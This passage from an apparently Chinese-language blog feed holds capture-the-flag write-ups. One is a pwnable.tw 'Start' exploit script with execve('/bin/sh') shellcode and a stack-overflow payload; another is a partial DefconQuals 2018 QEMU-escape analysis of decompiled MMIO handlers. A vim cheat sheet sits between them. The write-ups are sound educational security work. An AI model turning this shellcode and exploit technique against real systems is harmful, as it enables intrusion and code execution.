ecx</span><br><span class="line">   4:   51                      push   ecx</span><br><span class="line">   5:   68 2f 2f 73 68          push   0x68732f2f</span><br><span class="line">   a:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">   f:   89 e3                   mov    ebx,esp</span><br><span class="line">  11:   b0 0b                   mov    al,0xb</span><br><span class="line">  13:   cd 80                   int    0x80</span><br></pre></td></tr></table></figure><p>pwntools生成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcraft.i386.linux.sh()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwnable.tw writeup</title>
      <link href="/2019/12/25/pwnable-tw-writeup/"/>
      <url>/2019/12/25/pwnable-tw-writeup/</url>
      
        <content type="html"><![CDATA[<div class="note ">            <p>Every time a bell rings, an angel gets his wings.</p>          </div><h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">push    esp</span><br><span class="line">push    offset _exit</span><br><span class="line">xor     eax, eax</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">xor     edx, edx</span><br><span class="line">push    &apos;:FTC&apos;</span><br><span class="line">push    &apos; eht&apos;</span><br><span class="line">push    &apos; tra&apos;</span><br><span class="line">push    &apos;ts s&apos;</span><br><span class="line">push    2774654Ch</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h         ; len</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 3Ch</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; LINUX -</span><br><span class="line">add     esp, 14h</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>很明显的栈溢出，没有其他可以利用的函数和gadget，只好利用shellcode。因此需要泄露esp的地址，并且payload长度不能超过0x3c，因此需要精心构造shellcode。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment"># p = process("./start")</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">20</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">addr = u32(p.recv(<span class="number">4</span>))+<span class="number">20</span></span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">20</span> + p32(addr) + shellcode</span><br><span class="line"><span class="keyword">print</span> hex(len(payload))</span><br><span class="line"><span class="keyword">print</span> disasm(shellcode)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>linux 酷炫小工具</title>
      <link href="/2019/12/23/linux-%E9%85%B7%E7%82%AB%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
      <url>/2019/12/23/linux-%E9%85%B7%E7%82%AB%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>my_vim</title>
      <link href="/2019/12/19/my-vim/"/>
      <url>/2019/12/19/my-vim/</url>
      
        <content type="html"><![CDATA[<div class="note ">            <p>男人嘛，就要华而不实，花里胡哨！</p>          </div><h3 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h3><h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i  insert</span><br><span class="line">a  append</span><br><span class="line">o  换行</span><br></pre></td></tr></table></figure><h4 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">h/j/k/l  左/下/上/右</span><br><span class="line">w/e      单词</span><br><span class="line">gg/G     文件首/文件尾</span><br><span class="line">0/$      行首/行尾</span><br><span class="line">ctrl+f/ctrl+u  向前翻页/向后翻页</span><br></pre></td></tr></table></figure><h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/&#123;char&#125;     搜索字符串</span><br><span class="line">set hlsearch   高亮</span><br><span class="line">noh            取消高亮</span><br><span class="line">n/N            下一个/上一个</span><br></pre></td></tr></table></figure><h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% s/s1/s2/g      全局替换</span><br><span class="line">2,10 s/s1/s2/c   显示匹配个数</span><br></pre></td></tr></table></figure><h4 id="补全"><a href="#补全" class="headerlink" title="补全"></a>补全</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c+n c+p  单词</span><br><span class="line">c+x c+f  文件名</span><br><span class="line">c+x c+o  代码</span><br></pre></td></tr></table></figure><h4 id="复制粘贴"><a href="#复制粘贴" class="headerlink" title="复制粘贴"></a>复制粘贴</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">y/p   复制/粘贴</span><br><span class="line">set parst  粘贴模式</span><br><span class="line">set noparst 取消粘贴模式</span><br></pre></td></tr></table></figure><h4 id="分屏"><a href="#分屏" class="headerlink" title="分屏"></a>分屏</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vs  竖分屏（vertical split）</span><br><span class="line">sp  横分屏（split）</span><br></pre></td></tr></table></figure><h4 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v  字符</span><br><span class="line">V  行选</span><br><span class="line">c+v 块选</span><br></pre></td></tr></table></figure><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d    删除</span><br><span class="line">dw   删除单词</span><br><span class="line">dd   删除行</span><br></pre></td></tr></table></figure><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><h4 id="插件管理器"><a href="#插件管理器" class="headerlink" title="插件管理器"></a>插件管理器</h4><p><a href="https://github.com/junegunn/vim-plug" target="_blank" rel="noopener">vim-plug</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#unix 安装方法</span><br><span class="line">curl -fLo ~/.vim/autoload/plug.vim --create-dirs \</span><br><span class="line">    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p><a href="https://github.com/tpope/vim-commentary" target="_blank" rel="noopener">vim-commentary</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc  注释/取消注释</span><br><span class="line">cc   删除一行并进入insert模式</span><br></pre></td></tr></table></figure><h4 id="对称"><a href="#对称" class="headerlink" title="对称"></a>对称</h4><p><a href="https://github.com/tpope/vim-surround" target="_blank" rel="noopener">vim-surround</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ds   删除</span><br><span class="line">cs   替换</span><br><span class="line">ys   添加</span><br><span class="line"></span><br><span class="line">ys iw &quot;  单词添加</span><br><span class="line">ys iW &quot;  字符串添加（空格分隔）</span><br></pre></td></tr></table></figure><h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>~/.vimrc</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">set nu</span><br><span class="line"><span class="string">"colorscheme molokai</span></span><br><span class="line"><span class="string">colorscheme skeletor</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">set hlsearch</span></span><br><span class="line"><span class="string">set foldmethod=indent</span></span><br><span class="line"><span class="string">set autoindent</span></span><br><span class="line"><span class="string">let mapleader=','</span></span><br><span class="line"><span class="string">inoremap &lt;leader&gt;w &lt;Esc&gt;:w&lt;cr&gt;</span></span><br><span class="line"><span class="string">nnoremap &lt;leader&gt;w :w&lt;cr&gt;</span></span><br><span class="line">" Specify a directory for plugins</span><br><span class="line"><span class="string">" - For Neovim: stdpath('data') . '/plugged'</span></span><br><span class="line">" - Avoid using standard Vim directory names like 'plugin'</span><br><span class="line">call plug#begin('~/.vim/plugged')</span><br><span class="line">Plug 'mhinz/vim-startify'</span><br><span class="line">Plug 'vim-airline/vim-airline'</span><br><span class="line">Plug 'vim-airline/vim-airline-themes'</span><br><span class="line">Plug 'Yggdroot/indentLine'</span><br><span class="line">Plug 'scrooloose/nerdtree'</span><br><span class="line">Plug 'ctrlpvim/ctrlp.vim'</span><br><span class="line">Plug 'python-mode/python-mode', &#123; 'for': 'python', 'branch': 'develop' &#125;</span><br><span class="line">Plug 'easymotion/vim-easymotion'</span><br><span class="line">Plug 'tpope/vim-surround'</span><br><span class="line">Plug 'junegunn/fzf', &#123; 'dir': '~/.fzf', 'do': './install --all' &#125;</span><br><span class="line">Plug 'junegunn/fzf.vim'</span><br><span class="line">Plug 'tpope/vim-commentary'</span><br><span class="line">call plug#end()</span><br><span class="line"></span><br><span class="line"><span class="string">" NERDTree</span></span><br><span class="line"><span class="string">nnoremap &lt;leader&gt;v :NERDTreeFind&lt;cr&gt;</span></span><br><span class="line"><span class="string">nnoremap &lt;leader&gt;n :NERDTreeToggle&lt;cr&gt;</span></span><br><span class="line"><span class="string">let NERDTreeShowHidden=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">" ctrlp.vim</span><br><span class="line">let g:ctrlp_map='&lt;c-p&gt;'</span><br><span class="line"></span><br><span class="line"><span class="string">" pymode</span></span><br><span class="line"><span class="string">let g:pymode_python = 'python3'</span></span><br><span class="line"><span class="string">let g:pymode_trim_whitespaces = 1</span></span><br><span class="line"><span class="string">let g:pymode_doc = 1</span></span><br><span class="line"><span class="string">let g:pymode_docbind = 'K'</span></span><br><span class="line">let g:pymode_rope_goto_definition_bind = "&lt;C-]&gt;"</span><br><span class="line">let g:pymode_lint = 1</span><br><span class="line">let g:pymode_lint_checkers = ['pyflakes', 'pep8', 'mccabe', 'pylint']</span><br><span class="line">let g:pymode_options_max_line_length = 120</span><br><span class="line"></span><br><span class="line"><span class="string">" easymotion</span></span><br><span class="line"><span class="string">nmap ss &lt;Plug&gt;(easymotion-s2)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DefconQuals-2018-EC3</title>
      <link href="/2019/11/29/DefconQuals-2018-EC3/"/>
      <url>/2019/11/29/DefconQuals-2018-EC3/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这道题是一道堆相关的题目，原题是在Ubuntu16的环境下面，这里为了降低难度，把重点放在qemu上，选择了Ubuntu18的环境。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">there&apos;s a vulnerable PCI device in the qemu binary. players have to write a kernel driver for the ubuntu kernel that is there and then they have to exploit the qemu to read flag off the fsystem.</span><br></pre></td></tr></table></figure><p>官方描述，通过虚拟机逃逸读取flag。</p><p>查看文件列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r-- 1 kangel kangel   262144 5月  11  2018 bios-256k.bin</span><br><span class="line">-rw-r--r-- 1 kangel kangel   240128 5月  11  2018 efi-e1000.rom</span><br><span class="line">-rw-r--r-- 1 kangel kangel  1800548 11月 28 16:41 initramfs-busybox-x86_64.cpioz</span><br><span class="line">-rw-r--r-- 1 kangel kangel     9216 5月  11  2018 kvmvapic.bin</span><br><span class="line">-rw-r--r-- 1 kangel kangel     1536 5月  11  2018 linuxboot_dma.bin</span><br><span class="line">-rwxr-xr-x 1 kangel kangel 13541528 5月  12  2018 qemu-system-x86_64</span><br><span class="line">-rwxr-xr-x 1 kangel kangel      187 11月 28 16:26 run.sh</span><br><span class="line">-rw-r--r-- 1 kangel kangel    38912 5月  11  2018 vgabios-stdvga.bin</span><br><span class="line">-rw------- 1 kangel kangel  7144816 5月  11  2018 vmlinuz-4.4.0-119-generic</span><br></pre></td></tr></table></figure><p>cat run.sh查看启动脚本，给了文件系统，<code>ooo</code>应该就是有漏洞的pci设备了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./initramfs-busybox-x86_64.cpio.gz \</span><br><span class="line">-nographic \</span><br><span class="line">-kernel ./vmlinuz-4.4.0-119-generic \</span><br><span class="line">-append <span class="string">"priority=low console=ttyS0"</span> \</span><br><span class="line">-device ooo</span><br></pre></td></tr></table></figure><p>ida载入qemu-system-x86_64，搜索<code>ooo</code>发现没有相关函数，file一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜ file qemu-system-x86_64</span><br><span class="line">qemu-system-x86_64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),</span><br><span class="line">dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, </span><br><span class="line">BuildID[sha1]=b6c6ab3e87201dc5d18373dee7bee760367a8ffa, stripped</span><br></pre></td></tr></table></figure><p> 可以看到<code>qemu-system-x86_64</code>是<code>stripped</code>，符号被去掉了。</p><h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><p>在Ubuntu 18 执行<code>sudo ./run.sh</code>的出现以下错误，原因是缺少某些动态链接库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64: error while loading shared libraries: libiscsi.so.2: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure><p><code>ldd ./qemu-system-x86_64|grep not</code> 查看缺少的动态链接库，发现缺少<code>libiscsi.so.2</code>、<code>libpng12.so.0</code> 、 <code>libxenctrl-4.6.so</code> 。安装方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#libiscsi</span><br><span class="line">git clone https://github.com/sahlberg/libiscsi.git</span><br><span class="line">./autogen.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">cp /usr/lib/x86_64-linux-gnu/libiscsi.so.7 /lib/libiscsi.so.2</span><br><span class="line"></span><br><span class="line">#libpng12</span><br><span class="line">sudo wget -O /tmp/libpng12.deb http://mirrors.kernel.org/ubuntu/pool/main/libp/libpng/libpng12-0_1.2.54-1ubuntu1_amd64.deb </span><br><span class="line">sudo dpkg -i /tmp/libpng12.deb </span><br><span class="line">sudo rm /tmp/libpng12.deb</span><br><span class="line"></span><br><span class="line">#libxen</span><br><span class="line">sudo wget  -O /tmp/libxen.deb http://mirrors.kernel.org/ubuntu/pool/main/x/xen/libxen-4.6_4.6.5-0ubuntu1.4_amd64.deb</span><br><span class="line">sudo dpkg -i /tmp/libxen.deb</span><br><span class="line">sudo rm /tmp/libxen.deb</span><br></pre></td></tr></table></figure><p>然后就可以正常运行<code>sudo ./run.sh</code></p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><h4 id="确定设备"><a href="#确定设备" class="headerlink" title="确定设备"></a>确定设备</h4><p>在ida中搜索<code>ooo_class_init</code>来找到<code>ooo_class_init</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">ooo_class_init</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = sub_868F66(a1, <span class="string">"pci-device"</span>, <span class="string">"hw/misc/oooverflow.c"</span>, <span class="number">336L</span>L, <span class="string">"ooo_class_init"</span>);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">192</span>) = pci_ooo_realize;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">200</span>) = <span class="number">0L</span>L;</span><br><span class="line">  *(_WORD *)(result + <span class="number">224</span>) = <span class="number">0x420</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">226</span>) = <span class="number">0x1337</span>;</span><br><span class="line">  *(_BYTE *)(result + <span class="number">228</span>) = <span class="number">0x69</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">230</span>) = <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>lspci</code>可以确定<code>00:04.0</code>为<code>ooo</code>设备</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ # lspci</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:04.0 Class 00ff: 0420:1337</span><br></pre></td></tr></table></figure><p>查看resource文件可以发现mmio的大小为0x1000000，没有pmio</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource</span><br><span class="line">0x00000000fb000000 0x00000000fbffffff 0x0000000000040200</span><br></pre></td></tr></table></figure><p>在<code>ooo_class_init</code>函数里面可以确定<code>0x6E64A5</code>函数为<code>pci_ooo_realize</code> ，继续往上找可以确定<code>0x6E613C</code>为<code>ooo_mmio_read</code>函数以及<code>0x6E61F4</code>为<code>ooo_mmio_write</code>函数。 </p><h4 id="查看ooo-mmio-read函数"><a href="#查看ooo-mmio-read函数" class="headerlink" title="查看ooo_mmio_read函数"></a>查看<code>ooo_mmio_read</code>函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">ooo_mmio_read</span><span class="params">(__int64 a1, <span class="keyword">int</span> addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = a1;</span><br><span class="line">  dest = <span class="number">0x42069</span>LL;</span><br><span class="line">  v4 = (addr &amp; <span class="number">0xF0000</span>u) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (addr &amp; <span class="number">0xF00000</span>u) &gt;&gt; <span class="number">20</span> != <span class="number">15</span> &amp;&amp; qword_1317940[v4] )</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dest, (<span class="keyword">char</span> *)qword_1317940[v4] + (<span class="keyword">signed</span> __int16)addr, size);</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 可以看到<code>(addr &amp; 0xF0000u)</code>为idx，<code>addr</code>的低16位为<code>offset</code>。当<code>(addr &amp; 0xF00000u) &gt;&gt; 20</code>不为15时，将<code>qword_1317940[idx] + offset</code>中的数据拷贝出来赋值给<code>dest</code>，否则<code>dest</code>为<code>0x42069</code>，返回<code>dest</code>。 </p><h4 id="查看ooo-mmio-write函数"><a href="#查看ooo-mmio-write函数" class="headerlink" title="查看ooo_mmio_write函数"></a>查看<code>ooo_mmio_write</code>函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">ooo_mmio_write</span><span class="params">(__int64 a1, __int64 addr, __int64 var, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> n[<span class="number">12</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int16 v8; <span class="comment">// [rsp+22h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  v6 = addr;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">4</span>] = var;</span><br><span class="line">  v13 = a1;</span><br><span class="line">  v10 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)addr &amp; <span class="number">0xF00000</span>) &gt;&gt; <span class="number">20</span>;</span><br><span class="line">  v4 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)addr &amp; <span class="number">0xF00000</span>) &gt;&gt; <span class="number">20</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">      <span class="built_in">free</span>(qword_1317940[((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6 &amp; <span class="number">0xF0000</span>) &gt;&gt; <span class="number">16</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">      v12 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6 &amp; <span class="number">0xF0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">      v8 = v6;</span><br><span class="line">      <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)qword_1317940[v12] + (<span class="keyword">signed</span> __int16)v6, &amp;n[<span class="number">4</span>], size);</span><br><span class="line">      <span 